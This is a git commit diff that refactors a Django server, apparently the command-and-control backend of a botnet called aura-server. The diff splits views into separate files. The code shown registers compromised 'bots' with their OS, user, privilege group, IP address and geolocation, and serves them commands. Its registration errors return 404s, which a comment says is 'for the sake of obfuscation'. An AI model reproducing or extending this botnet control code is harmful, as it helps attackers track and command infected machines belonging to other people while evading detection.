997dcc11989ca7adce0c2e432bc92c908b8b1a44
Randy Ramos <rramos1295@gmail.com>
2017-11-25 18:36:18 -0500

    Split Django views into separate files

---
+++ aura-server/convey/views/__init__.py
@@ -0,0 +1,3 @@
+from convey.views.index import *
+from convey.views.cmd import *
+from convey.views.register import *
--- aura-server/convey/views/cmd.py
+++ aura-server/convey/views/cmd.py
@@ -1,28 +1,8 @@
-import random
-import json
-from urllib.request import urlopen
-
-from django.shortcuts import render, get_object_or_404
-from django.http import HttpResponse, HttpResponseRedirect, Http404
+from django.http import HttpResponse, Http404
 from django.views.decorators.csrf import csrf_exempt
 from django.utils import timezone
-
-from .models import Bot, Command, Bot_Command
-
-# Determine a new bot's group based on OS and privilege
-def get_group(operating_sys, user):
-    with open('groups.json', 'r') as infile:
-        groups = json.loads(infile.read())
-    users = groups[operating_sys.lower()]
-    try:
-        group_num = users[user]
-        if 'windows' in operating_sys and '(admin)' in user:
-            group_num = users['admin']
-    except KeyError:
-        group_num = users['standard']
-
-    return group_num
-
+from django.shortcuts import get_object_or_404
+from convey.models import Bot, Command, Bot_Command
 
 # Grab a Command object based on a hash_sum or group number
 # If no command exists for the query, return None
@@ -43,46 +23,6 @@ def get_cmd(bot, query_set, hash_sum=None, group=None):
             return cmd
 
     return None
-
-
-# Views begin here
-
-def index(request):
-    return HttpResponse('')
-
-
-@csrf_exempt
-def register(request):
-    try:
-        hash_type = request.POST['hash_type']
-        hash_sum = request.POST['hash_sum']
-        operating_sys = request.POST['operating_sys']
-        ip_addr = request.POST['ip_addr']
-        user = request.POST['user']
-        group = get_group(operating_sys, user)
-        last_contact = timezone.now()
-
-        geo_html = urlopen('https://ipinfo.io/{}/geo'.format(ip_addr)).read().decode('utf-8')
-        geo_json = json.loads(geo_html)
-        geolocation = geo_json['country']
-
-        bot = Bot.objects.create(
-            hash_type=hash_type,
-            hash_sum=hash_sum,
-            group=group,
-            operating_sys=operating_sys,
-            user=user,
-            ip_addr=ip_addr,
-            geolocation=geolocation,
-            last_contact=last_contact,
-        )
-
-        return HttpResponse('')
-    except:
-        # An error in registration likely means tampering or something went wrong
-        # Return a 404 for the sake of obfuscation
-        raise Http404()
-
 
 @csrf_exempt
 def cmd(request):
